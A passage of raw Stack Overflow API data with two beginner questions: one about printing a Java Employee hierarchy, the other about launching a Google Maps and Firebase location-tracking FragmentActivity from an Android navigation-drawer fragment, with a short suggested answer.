}\n\n    void printHelper(int level){\n        for(int i = 0; i &lt; level; i++){\n            System.out.print(&quot;\\t&quot;);\n        }\n        System.out.println(name);\n        if(subEmployees.isEmpty()){\n            return;\n        }\n        for (Employee employee : subEmployees) {\n            level = level + 1;\n            employee.printHelper(level);\n        }\n    }\n\n    public static void main(String args[]){\n        Employee susan = new Employee(&quot;Susan&quot;);\n        Employee jake  = new Employee(&quot;Jake&quot;); //HERE IS WHERE I NEED HELP\n        Employee bevan  = new Employee(&quot;Bevan&quot;); //HERE IS WHERE I NEED HELP\n        jake.addSub(bevan);\n        susan.addSub(jake);\n        susan.print();\n    }\n}\n\n</code></pre>\n<p>And the console output is as below.</p>\n<pre><code>The newest employee is: Susan\nThe newest employee is: Jake\nThe newest employee is: Bevan\nAdding Bevan to the employee list\nAdding Jake to the employee list\nSusan\n    Jake\n        Bevan\n\n</code></pre>\n"}],"owner":{"account_id":23961372,"reputation":1,"user_id":17951402,"display_name":"Bethany Whitehead"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":80,"favorite_count":0,"down_vote_count":2,"up_vote_count":0,"closed_date":1642399420,"accepted_answer_id":70737107,"answer_count":1,"score":-2,"last_activity_date":1642481621,"creation_date":1642391647,"question_id":70736358,"body_markdown":"If anyone knows Java well I would really appreciate the help. Looking to create two or more instances of the `Employee` object. As you can see in the `Main` class I have successfully created the first object &quot;Susan&quot; but when I try to add &quot;Jake&quot; it doesn&#39;t seem to work and I can&#39;t figure out why. I have added the console output of my test code for some clarity. Thanks in advance! \r\n\r\n    import java.util.LinkedList;\r\n\r\n    public class Employee {\r\n        String name;\r\n        LinkedList&lt;Employee&gt; employees;\r\n    \r\n        public Employee(String ename){\r\n            name = ename;\r\n            employees = new LinkedList&lt;Employee&gt;();\r\n            System.out.println(&quot;The newest employee is: &quot; + ename);\r\n        }\r\n    \r\n        void addSub(Employee subName){\r\n            employees.add(subName);\r\n            System.out.println(&quot;Adding &quot; + subName + &quot; to the employee list&quot;);\r\n        }\r\n    \r\n        void getEmployee(int num){\r\n            employees.get(num);\r\n        }\r\n    \r\n        void print(){\r\n            printHelper(0);\r\n        }\r\n    \r\n        void printHelper(int level){\r\n            for(int i = 0; i &lt; level; i++){\r\n                System.out.print(&quot;\\t&quot;);\r\n            }\r\n            System.out.println(name + &quot;\\n&quot;);\r\n            level++;\r\n            for(int j = 0; j &lt; employees.size(); j++){\r\n                System.out.println(employees.get(j));\r\n                printHelper(level);\r\n            }\r\n        }\r\n    \r\n        public static void main(String args[]){\r\n            Employee susan = new Employee(&quot;Susan&quot;);\r\n            Employee jake = new Employee(&quot;Jake&quot;); //HERE IS WHERE I NEED HELP\r\n            susan.addSub(jake);\r\n            \r\n            susan.print();\r\n        }\r\n    }\r\n\r\n//////////////////////////////////////////////////////////\r\nCONSOLE OUTPUT\r\n\r\nThe newest employee is: Susan\r\n\r\nThe newest employee is: Jake\r\n\r\nAdding Employee@299a06ac to the employee list\r\n\r\nSusan\r\n\r\n\r\n\r\n","title":"Why isn&#39;t my java code able to create multiple instances of an object?","body":"<p>If anyone knows Java well I would really appreciate the help. Looking to create two or more instances of the <code>Employee</code> object. As you can see in the <code>Main</code> class I have successfully created the first object &quot;Susan&quot; but when I try to add &quot;Jake&quot; it doesn't seem to work and I can't figure out why. I have added the console output of my test code for some clarity. Thanks in advance!</p>\n<pre><code>import java.util.LinkedList;\n\npublic class Employee {\n    String name;\n    LinkedList&lt;Employee&gt; employees;\n\n    public Employee(String ename){\n        name = ename;\n        employees = new LinkedList&lt;Employee&gt;();\n        System.out.println(&quot;The newest employee is: &quot; + ename);\n    }\n\n    void addSub(Employee subName){\n        employees.add(subName);\n        System.out.println(&quot;Adding &quot; + subName + &quot; to the employee list&quot;);\n    }\n\n    void getEmployee(int num){\n        employees.get(num);\n    }\n\n    void print(){\n        printHelper(0);\n    }\n\n    void printHelper(int level){\n        for(int i = 0; i &lt; level; i++){\n            System.out.print(&quot;\\t&quot;);\n        }\n        System.out.println(name + &quot;\\n&quot;);\n        level++;\n        for(int j = 0; j &lt; employees.size(); j++){\n            System.out.println(employees.get(j));\n            printHelper(level);\n        }\n    }\n\n    public static void main(String args[]){\n        Employee susan = new Employee(&quot;Susan&quot;);\n        Employee jake = new Employee(&quot;Jake&quot;); //HERE IS WHERE I NEED HELP\n        susan.addSub(jake);\n        \n        susan.print();\n    }\n}\n</code></pre>\n<p>//////////////////////////////////////////////////////////\nCONSOLE OUTPUT</p>\n<p>The newest employee is: Susan</p>\n<p>The newest employee is: Jake</p>\n<p>Adding Employee@299a06ac to the employee list</p>\n<p>Susan</p>\n"},{"tags":["java","android","firebase"],"comments":[{"owner":{"account_id":-1,"reputation":1,"user_id":-1,"display_name":"Community"},"score":0,"creation_date":1643224928,"post_id":70744375,"comment_id":125285793,"body_markdown":"Please trim your code to make it easier to find your problem. Follow these guidelines to create a [minimal reproducible example](https://stackoverflow.com/help/minimal-reproducible-example).","body":"Please trim your code to make it easier to find your problem. Follow these guidelines to create a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}],"answers":[{"tags":[],"owner":{"account_id":15019503,"reputation":81,"user_id":10841385,"display_name":"Fakhri Khairi"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642480928,"creation_date":1642480928,"answer_id":70750367,"question_id":70744375,"body_markdown":"I think you forget to Commit the transaction, like this\r\n\r\n    btn.setOnClickListener(new View.OnClickListener() {\r\n            @Override\r\n            public void onClick(View view) {\r\n                FragmentActivity fragment = new DeterminaFrag();\r\n                FragmentManager fragmentManager = fragment.getSupportFragmentManager();\r\n                fragmentManager.beginTransaction().replace(R.id.nav_host_fragment_content_main, fragment);\r\n                fragmentManager.commit();\r\n\r\n            }\r\n        });\r\n\r\nI hope it&#39;s can help your problem","title":"Change activity in a navigation Drawer with Fragment and FragmentActivity","body":"<p>I think you forget to Commit the transaction, like this</p>\n<pre><code>btn.setOnClickListener(new View.OnClickListener() {\n        @Override\n        public void onClick(View view) {\n            FragmentActivity fragment = new DeterminaFrag();\n            FragmentManager fragmentManager = fragment.getSupportFragmentManager();\n            fragmentManager.beginTransaction().replace(R.id.nav_host_fragment_content_main, fragment);\n            fragmentManager.commit();\n\n        }\n    });\n</code></pre>\n<p>I hope it's can help your problem</p>\n"}],"owner":{"account_id":23949728,"reputation":21,"user_id":17941521,"display_name":"newbieprog"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":34,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1642480928,"creation_date":1642436170,"question_id":70744375,"body_markdown":"I am a newbie programmer and I am trying to learn something of Android.\r\nI follow some tutorials and now I have a navigation Drawer App. Until now I have managed changes of layouts with the buttons in the menu. Now I want to create a map locator and I followed this [Tutorial][1]. Now I want to click a button that brings me to this new Activity in which I can track the position.\r\n\r\nMy code is:\r\n**GalleryFragment.Java**\r\n\r\n```\r\npackage com.example.frangela.ui.gallery;\r\n\r\nimport android.os.Bundle;\r\nimport android.view.LayoutInflater;\r\nimport android.view.View;\r\nimport android.view.ViewGroup;\r\nimport android.widget.Button;\r\nimport android.widget.EditText;\r\nimport android.widget.TextView;\r\n\r\nimport androidx.annotation.NonNull;\r\nimport androidx.annotation.Nullable;\r\nimport androidx.fragment.app.Fragment;\r\nimport androidx.fragment.app.FragmentActivity;\r\nimport androidx.fragment.app.FragmentManager;\r\nimport androidx.lifecycle.Observer;\r\nimport androidx.lifecycle.ViewModelProvider;\r\n\r\nimport com.example.frangela.R;\r\nimport com.example.frangela.Spesa;\r\nimport com.example.frangela.databinding.FragmentGalleryBinding;\r\nimport com.example.frangela.ui.deter.DeterminaFrag;\r\nimport com.google.firebase.database.DatabaseReference;\r\nimport com.google.firebase.database.FirebaseDatabase;\r\n\r\npublic class GalleryFragment extends Fragment {\r\n    private GalleryViewModel galleryViewModel;\r\n    private FragmentGalleryBinding binding;\r\n\r\n    public View onCreateView(@NonNull LayoutInflater inflater,\r\n                             ViewGroup container, Bundle savedInstanceState) {\r\n        galleryViewModel =\r\n                new ViewModelProvider(this).get(GalleryViewModel.class);\r\n\r\n        binding = FragmentGalleryBinding.inflate(inflater, container, false);\r\n        View root = binding.getRoot();\r\n        EditText ET = binding.EditProva;\r\n        Button btn = binding.buttonProva;\r\n\r\n        btn.setOnClickListener(new View.OnClickListener() {\r\n            @Override\r\n            public void onClick(View view) {\r\n                FragmentActivity fragment = new DeterminaFrag();\r\n                FragmentManager fragmentManager = fragment.getSupportFragmentManager();\r\n                fragmentManager.beginTransaction().replace(R.id.nav_host_fragment_content_main, fragment);\r\n\r\n            }\r\n        });\r\n\r\n        galleryViewModel.getText().observe(getViewLifecycleOwner(), new Observer&lt;String&gt;() {\r\n            @Override\r\n            public void onChanged(@Nullable String s) {\r\n                //textView.setText(s);\r\n            }\r\n        });\r\n        return root;\r\n    }\r\n\r\n    @Override\r\n    public void onDestroyView() {\r\n        super.onDestroyView();\r\n        binding = null;\r\n    }\r\n}\r\n\r\n\r\n\r\n```\r\n**DeterminaFrag.java**\r\n\r\n```\r\npackage com.example.frangela.ui.deter;\r\nimport androidx.annotation.NonNull;\r\nimport androidx.core.app.ActivityCompat;\r\nimport androidx.fragment.app.FragmentActivity;\r\n\r\nimport android.Manifest;\r\nimport android.content.pm.PackageManager;\r\nimport android.location.Location;\r\nimport android.location.LocationListener;\r\nimport android.location.LocationManager;\r\nimport android.os.Bundle;\r\nimport android.view.View;\r\nimport android.widget.EditText;\r\n\r\nimport com.example.frangela.R;\r\nimport com.google.android.gms.maps.CameraUpdateFactory;\r\nimport com.google.android.gms.maps.GoogleMap;\r\nimport com.google.android.gms.maps.OnMapReadyCallback;\r\nimport com.google.android.gms.maps.SupportMapFragment;\r\nimport com.google.android.gms.maps.model.LatLng;\r\nimport com.google.android.gms.maps.model.MarkerOptions;\r\nimport com.google.firebase.database.DataSnapshot;\r\nimport com.google.firebase.database.DatabaseError;\r\nimport com.google.firebase.database.DatabaseReference;\r\nimport com.google.firebase.database.FirebaseDatabase;\r\nimport com.google.firebase.database.ValueEventListener;\r\n\r\nimport java.util.Arrays;\r\n\r\npublic class DeterminaFrag extends FragmentActivity implements OnMapReadyCallback {\r\n\r\n    private GoogleMap mMap;\r\n    private DatabaseReference databaseReference;\r\n\r\n    private LocationListener locationListener;\r\n    private LocationManager locationManager;\r\n    private final long MIN_TIME = 1000;\r\n    private final long MIN_DIST = 5;\r\n\r\n    private EditText editTextLatitude;\r\n    private EditText editTextLongitude;\r\n\r\n\r\n    @Override\r\n    protected void onCreate(Bundle savedInstanceState) {\r\n        super.onCreate(savedInstanceState);\r\n        setContentView(R.layout.activity_maps);\r\n        // Obtain the SupportMapFragment and get notified when the map is ready to be used.\r\n        SupportMapFragment mapFragment = (SupportMapFragment) getSupportFragmentManager()\r\n                .findFragmentById(R.id.map);\r\n        mapFragment.getMapAsync(this);\r\n\r\n        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, PackageManager.PERMISSION_GRANTED);\r\n\r\n        editTextLatitude = findViewById(R.id.editText);\r\n        editTextLongitude = findViewById(R.id.editText2);\r\n\r\n        databaseReference = FirebaseDatabase.getInstance().getReference(&quot;Location&quot;);\r\n        databaseReference.addValueEventListener(new ValueEventListener() {\r\n            @Override\r\n            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {\r\n                try {\r\n                    String databaseLatitudeString = dataSnapshot.child(&quot;latitude&quot;).getValue().toString().substring(1, dataSnapshot.child(&quot;latitude&quot;).getValue().toString().length()-1);\r\n                    String databaseLongitudedeString = dataSnapshot.child(&quot;longitude&quot;).getValue().toString().substring(1, dataSnapshot.child(&quot;longitude&quot;).getValue().toString().length()-1);\r\n\r\n                    String[] stringLat = databaseLatitudeString.split(&quot;, &quot;);\r\n                    Arrays.sort(stringLat);\r\n                    String latitude = stringLat[stringLat.length-1].split(&quot;=&quot;)[1];\r\n\r\n                    String[] stringLong = databaseLongitudedeString.split(&quot;, &quot;);\r\n                    Arrays.sort(stringLong);\r\n                    String longitude = stringLong[stringLong.length-1].split(&quot;=&quot;)[1];\r\n\r\n\r\n                    LatLng latLng = new LatLng(Double.parseDouble(latitude), Double.parseDouble(longitude));\r\n\r\n                    mMap.addMarker(new MarkerOptions().position(latLng).title(latitude + &quot; , &quot; + longitude));\r\n                    mMap.moveCamera(CameraUpdateFactory.newLatLng(latLng));\r\n\r\n\r\n                }\r\n                catch (Exception e){\r\n                    e.printStackTrace();\r\n                }\r\n\r\n\r\n            }\r\n\r\n            @Override\r\n            public void onCancelled(@NonNull DatabaseError databaseError) {\r\n\r\n            }\r\n        });\r\n    }\r\n\r\n\r\n    /**\r\n     * Manipulates the map once available.\r\n     * This callback is triggered when the map is ready to be used.\r\n     * This is where we can add markers or lines, add listeners or move the camera. In this case,\r\n     * we just add a marker near Sydney, Australia.\r\n     * If Google Play services is not installed on the device, the user will be prompted to install\r\n     * it inside the SupportMapFragment. This method will only be triggered once the user has\r\n     * installed Google Play services and returned to the app.\r\n     */\r\n    @Override\r\n    public void onMapReady(GoogleMap googleMap) {\r\n        mMap = googleMap;\r\n\r\n//        // Add a marker in Sydney and move the camera\r\n//        LatLng sydney = new LatLng(-34, 151);\r\n//        mMap.addMarker(new MarkerOptions().position(sydney).title(&quot;Marker in Sydney&quot;));\r\n//        mMap.moveCamera(CameraUpdateFactory.newLatLng(sydney));\r\n\r\n        locationListener = new LocationListener() {\r\n            @Override\r\n            public void onLocationChanged(Location location) {\r\n                try {\r\n                    editTextLatitude.setText(Double.toString(location.getLatitude()));\r\n                    editTextLongitude.setText(Double.toString(location.getLongitude()));\r\n                } catch (Exception e) {\r\n                    e.printStackTrace();\r\n                }\r\n\r\n            }\r\n\r\n            @Override\r\n            public void onStatusChanged(String s, int i, Bundle bundle) {\r\n\r\n            }\r\n\r\n            @Override\r\n            public void onProviderEnabled(String s) {\r\n\r\n            }\r\n\r\n            @Override\r\n            public void onProviderDisabled(String s) {\r\n\r\n            }\r\n        };\r\n\r\n        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);\r\n\r\n        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &amp;&amp; checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {\r\n            // TODO: Consider calling\r\n            //    Activity#requestPermissions\r\n            // here to request the missing permissions, and then overriding\r\n            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,\r\n            //                                          int[] grantResults)\r\n            // to handle the case where the user grants the permission. See the documentation\r\n            // for Activity#requestPermissions for more details.\r\n            return;\r\n        }\r\n\r\n        try {\r\n            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME, MIN_DIST, locationListener);\r\n            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, MIN_TIME, MIN_DIST, locationListener);\r\n        }\r\n        catch (Exception e){\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    public void updateButtonOnclick(View view){\r\n\r\n        databaseReference.child(&quot;latitude&quot;).push().setValue(editTextLatitude.getText().toString());\r\n        databaseReference.child(&quot;longitude&quot;).push().setValue(editTextLongitude.getText().toString());\r\n\r\n    }\r\n}\r\n\r\n```\r\n**fragment_Gallery.xml**\r\n\r\n```\r\n\r\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\r\n&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;\r\n    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;\r\n    xmlns:tools=&quot;http://schemas.android.com/tools&quot;\r\n    android:layout_width=&quot;match_parent&quot;\r\n    android:layout_height=&quot;match_parent&quot;\r\n    tools:context=&quot;.ui.gallery.GalleryFragment&quot;&gt;\r\n\r\n    &lt;EditText\r\n        android:id=&quot;@+id/EditProva&quot;\r\n        android:layout_width=&quot;wrap_content&quot;\r\n        android:layout_height=&quot;wrap_content&quot;\r\n        android:layout_marginTop=&quot;100sp&quot;\r\n        android:foregroundGravity=&quot;center_horizontal&quot;\r\n        android:gravity=&quot;center_horizontal&quot;\r\n        android:padding=&quot;40sp&quot;\r\n        android:text=&quot;Inserire qualcosa di prova&quot;\r\n        app:layout_constraintEnd_toEndOf=&quot;parent&quot;\r\n        app:layout_constraintStart_toStartOf=&quot;parent&quot; /&gt;\r\n    &lt;Button\r\n        android:id=&quot;@+id/button_prova&quot;\r\n        android:layout_width=&quot;wrap_content&quot;\r\n        android:layout_height=&quot;wrap_content&quot;\r\n        android:text=&quot;Prova&quot;\r\n        app:layout_constraintTop_toBottomOf=&quot;@+id/EditProva&quot;\r\n        tools:layout_editor_absoluteX=&quot;150dp&quot; /&gt;\r\n&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt;\r\n\r\n```\r\n**activity_maps.xml**\r\n```\r\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\r\n&lt;FrameLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;\r\n    xmlns:tools=&quot;http://schemas.android.com/tools&quot;\r\n    android:layout_width=&quot;match_parent&quot;\r\n    android:layout_height=&quot;match_parent&quot;\r\n    tools:context=&quot;.ui.deter.DeterminaFrag&quot;&gt;\r\n\r\n\r\n    &lt;fragment\r\n        android:id=&quot;@+id/map&quot;\r\n        android:name=&quot;com.google.android.gms.maps.SupportMapFragment&quot;\r\n        android:layout_width=&quot;match_parent&quot;\r\n        android:layout_height=&quot;550dp&quot;\r\n        tools:context=&quot;.MapsActivity&quot;\r\n        tools:layout=&quot;@android:layout/simple_spinner_dropdown_item&quot; /&gt;\r\n\r\n    &lt;EditText\r\n        android:id=&quot;@+id/editText&quot;\r\n        android:layout_width=&quot;wrap_content&quot;\r\n        android:layout_height=&quot;wrap_content&quot;\r\n        android:layout_marginStart=&quot;30dp&quot;\r\n        android:layout_marginTop=&quot;550dp&quot;\r\n        android:ems=&quot;10&quot;\r\n        android:hint=&quot;Latitudine&quot;\r\n        android:inputType=&quot;textPersonName&quot;\r\n        android:autofillHints=&quot;&quot; /&gt;\r\n\r\n    &lt;EditText\r\n        android:id=&quot;@+id/editText2&quot;\r\n        android:layout_width=&quot;wrap_content&quot;\r\n        android:layout_height=&quot;wrap_content&quot;\r\n        android:layout_marginStart=&quot;220dp&quot;\r\n        android:layout_marginTop=&quot;550dp&quot;\r\n        android:ems=&quot;10&quot;\r\n        android:hint=&quot;Longitudine&quot;\r\n        android:inputType=&quot;textPersonName&quot;\r\n        android:autofillHints=&quot;&quot; /&gt;\r\n\r\n    &lt;Button\r\n        android:id=&quot;@+id/button&quot;\r\n        android:layout_width=&quot;wrap_content&quot;\r\n        android:layout_height=&quot;wrap_content&quot;\r\n        android:layout_marginStart=&quot;150dp&quot;\r\n        android:layout_marginTop=&quot;600dp&quot;\r\n        android:onClick=&quot;updateButtonOnclick&quot;\r\n        android:text=&quot;Aggiorna&quot; /&gt;\r\n\r\n&lt;/FrameLayout&gt;\r\n``` \r\n**content_main.xml**\r\n\r\n```\r\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\r\n&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;\r\n    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;\r\n    xmlns:tools=&quot;http://schemas.android.com/tools&quot;\r\n    android:layout_width=&quot;match_parent&quot;\r\n    android:layout_height=&quot;match_parent&quot;\r\n    app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot;\r\n    tools:showIn=&quot;@layout/app_bar_main&quot;&gt;\r\n\r\n    &lt;fragment\r\n        android:id=&quot;@+id/nav_host_fragment_content_main&quot;\r\n        android:name=&quot;androidx.navigation.fragment.NavHostFragment&quot;\r\n        android:layout_width=&quot;match_parent&quot;\r\n        android:layout_height=&quot;match_parent&quot;\r\n        app:defaultNavHost=&quot;true&quot;\r\n        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;\r\n        app:layout_constraintRight_toRightOf=&quot;parent&quot;\r\n        app:layout_constraintTop_toTopOf=&quot;parent&quot;\r\n        app:navGraph=&quot;@navigation/mobile_navigation&quot; /&gt;\r\n&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt;\r\n``` \r\n\r\nI think the problem is in this code (in fact it does not even compile)\r\n```\r\n        btn.setOnClickListener(new View.OnClickListener() {\r\n            @Override\r\n            public void onClick(View view) {\r\n                FragmentActivity fragment = new DeterminaFrag();\r\n                FragmentManager fragmentManager = fragment.getSupportFragmentManager();\r\n                fragmentManager.beginTransaction().replace(R.id.nav_host_fragment_content_main, fragment);\r\n\r\n            }\r\n        });\r\n```\r\n\r\nI don&#39;t know if is possible to change this Fragment into a FragmentActivity. I have looked for similar questionsn but I haven&#39;t find anything.\r\nThank you for any help\r\n\r\n  [1]: https://programmerworld.co/android/create-location-tracking-android-app-by-exchanging-location-information-over-firebase-database/","title":"Change activity in a navigation Drawer with Fragment and FragmentActivity","body":"<p>I am a newbie programmer and I am trying to learn something of Android.\nI follow some tutorials and now I have a navigation Drawer App. Until now I have managed changes of layouts with the buttons in the menu. Now I want to create a map locator and I followed this <a href=\"https://programmerworld.co/android/create-location-tracking-android-app-by-exchanging-location-information-over-firebase-database/\" rel=\"nofollow noreferrer\">Tutorial</a>. Now I want to click a button that brings me to this new Activity in which I can track the position.</p>\n<p>My code is:\n<strong>GalleryFragment.Java</strong></p>\n<pre><code>package com.example.frangela.ui.gallery;\n\nimport android.os.Bundle;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.TextView;\n\nimport androidx.annotation.NonNull;\nimport androidx.annotation.Nullable;\nimport androidx.fragment.app.Fragment;\nimport androidx.fragment.app.FragmentActivity;\nimport androidx.fragment.app.FragmentManager;\nimport androidx.lifecycle.Observer;\nimport androidx.lifecycle.ViewModelProvider;\n\nimport com.example.frangela.R;\nimport com.example.frangela.Spesa;\nimport com.example.frangela.databinding.FragmentGalleryBinding;\nimport com.example.frangela.ui.deter.DeterminaFrag;\nimport com.google.firebase.database.DatabaseReference;\nimport com.google.firebase.database.FirebaseDatabase;\n\npublic class GalleryFragment extends Fragment {\n    private GalleryViewModel galleryViewModel;\n    private FragmentGalleryBinding binding;\n\n    public View onCreateView(@NonNull LayoutInflater inflater,\n                             ViewGroup container, Bundle savedInstanceState) {\n        galleryViewModel =\n                new ViewModelProvider(this).get(GalleryViewModel.class);\n\n        binding = FragmentGalleryBinding.inflate(inflater, container, false);\n        View root = binding.getRoot();\n        EditText ET = binding.EditProva;\n        Button btn = binding.buttonProva;\n\n        btn.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                FragmentActivity fragment = new DeterminaFrag();\n                FragmentManager fragmentManager = fragment.getSupportFragmentManager();\n                fragmentManager.beginTransaction().replace(R.id.nav_host_fragment_content_main, fragment);\n\n            }\n        });\n\n        galleryViewModel.getText().observe(getViewLifecycleOwner(), new Observer&lt;String&gt;() {\n            @Override\n            public void onChanged(@Nullable String s) {\n                //textView.setText(s);\n            }\n        });\n        return root;\n    }\n\n    @Override\n    public void onDestroyView() {\n        super.onDestroyView();\n        binding = null;\n    }\n}\n\n\n\n</code></pre>\n<p><strong>DeterminaFrag.java</strong></p>\n<pre><code>package com.example.frangela.ui.deter;\nimport androidx.annotation.NonNull;\nimport androidx.core.app.ActivityCompat;\nimport androidx.fragment.app.FragmentActivity;\n\nimport android.Manifest;\nimport android.content.pm.PackageManager;\nimport android.location.Location;\nimport android.location.LocationListener;\nimport android.location.LocationManager;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.EditText;\n\nimport com.example.frangela.R;\nimport com.google.android.gms.maps.CameraUpdateFactory;\nimport com.google.android.gms.maps.GoogleMap;\nimport com.google.android.gms.maps.OnMapReadyCallback;\nimport com.google.android.gms.maps.SupportMapFragment;\nimport com.google.android.gms.maps.model.LatLng;\nimport com.google.android.gms.maps.model.MarkerOptions;\nimport com.google.firebase.database.DataSnapshot;\nimport com.google.firebase.database.DatabaseError;\nimport com.google.firebase.database.DatabaseReference;\nimport com.google.firebase.database.FirebaseDatabase;\nimport com.google.firebase.database.ValueEventListener;\n\nimport java.util.Arrays;\n\npublic class DeterminaFrag extends FragmentActivity implements OnMapReadyCallback {\n\n    private GoogleMap mMap;\n    private DatabaseReference databaseReference;\n\n    private LocationListener locationListener;\n    private LocationManager locationManager;\n    private final long MIN_TIME = 1000;\n    private final long MIN_DIST = 5;\n\n    private EditText editTextLatitude;\n    private EditText editTextLongitude;\n\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_maps);\n        // Obtain the SupportMapFragment and get notified when the map is ready to be used.\n        SupportMapFragment mapFragment = (SupportMapFragment) getSupportFragmentManager()\n                .findFragmentById(R.id.map);\n        mapFragment.getMapAsync(this);\n\n        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, PackageManager.PERMISSION_GRANTED);\n\n        editTextLatitude = findViewById(R.id.editText);\n        editTextLongitude = findViewById(R.id.editText2);\n\n        databaseReference = FirebaseDatabase.getInstance().getReference(&quot;Location&quot;);\n        databaseReference.addValueEventListener(new ValueEventListener() {\n            @Override\n            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {\n                try {\n                    String databaseLatitudeString = dataSnapshot.child(&quot;latitude&quot;).getValue().toString().substring(1, dataSnapshot.child(&quot;latitude&quot;).getValue().toString().length()-1);\n                    String databaseLongitudedeString = dataSnapshot.child(&quot;longitude&quot;).getValue().toString().substring(1, dataSnapshot.child(&quot;longitude&quot;).getValue().toString().length()-1);\n\n                    String[] stringLat = databaseLatitudeString.split(&quot;, &quot;);\n                    Arrays.sort(stringLat);\n                    String latitude = stringLat[stringLat.length-1].split(&quot;=&quot;)[1];\n\n                    String[] stringLong = databaseLongitudedeString.split(&quot;, &quot;);\n                    Arrays.sort(stringLong);\n                    String longitude = stringLong[stringLong.length-1].split(&quot;=&quot;)[1];\n\n\n                    LatLng latLng = new LatLng(Double.parseDouble(latitude), Double.parseDouble(longitude));\n\n                    mMap.addMarker(new MarkerOptions().position(latLng).title(latitude + &quot; , &quot; + longitude));\n                    mMap.moveCamera(CameraUpdateFactory.newLatLng(latLng));\n\n\n                }\n                catch (Exception e){\n                    e.printStackTrace();\n                }\n\n\n            }\n\n            @Override\n            public void onCancelled(@NonNull DatabaseError databaseError) {\n\n            }\n        });\n    }\n\n\n    /**\n     * Manipulates the map once available.\n     * This callback is triggered when the map is ready to be used.\n     * This is where we can add markers or lines, add listeners or move the camera. In this case,\n     * we just add a marker near Sydney, Australia.\n     * If Google Play services is not installed on the device, the user will be prompted to install\n     * it inside the SupportMapFragment. This method will only be triggered once the user has\n     * installed Google Play services and returned to the app.\n     */\n    @Override\n    public void onMapReady(GoogleMap googleMap) {\n        mMap = googleMap;\n\n//        // Add a marker in Sydney and move the camera\n//        LatLng sydney = new LatLng(-34, 151);\n//        mMap.addMarker(new MarkerOptions().position(sydney).title(&quot;Marker in Sydney&quot;));\n//        mMap.moveCamera(CameraUpdateFactory.newLatLng(sydney));\n\n        locationListener = new LocationListener() {\n            @Override\n            public void onLocationChanged(Location location) {\n                try {\n                    editTextLatitude.setText(Double.toString(location.getLatitude()));\n                    editTextLongitude.setText(Double.toString(location.getLongitude()));\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n\n            }\n\n            @Override\n            public void onStatusChanged(String s, int i, Bundle bundle) {\n\n            }\n\n            @Override\n            public void onProviderEnabled(String s) {\n\n            }\n\n            @Override\n            public void onProviderDisabled(String s) {\n\n            }\n        };\n\n        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);\n\n        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &amp;&amp; checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {\n            // TODO: Consider calling\n            //    Activity#requestPermissions\n            // here to request the missing permissions, and then overriding\n            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,\n            //                                          int[] grantResults)\n            // to handle the case where the user grants the permission. See the documentation\n            // for Activity#requestPermissions for more details.\n            return;\n        }\n\n        try {\n            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME, MIN_DIST, locationListener);\n            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, MIN_TIME, MIN_DIST, locationListener);\n        }\n        catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    public void updateButtonOnclick(View view){\n\n        databaseReference.child(&quot;latitude&quot;).push().setValue(editTextLatitude.getText().toString());\n        databaseReference.child(&quot;longitude&quot;).push().setValue(editTextLongitude.getText().toString());\n\n    }\n}\n\n</code></pre>\n<p><strong>fragment_Gallery.xml</strong></p>\n<pre><code>\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\n&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;\n    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;\n    xmlns:tools=&quot;http://schemas.android.com/tools&quot;\n    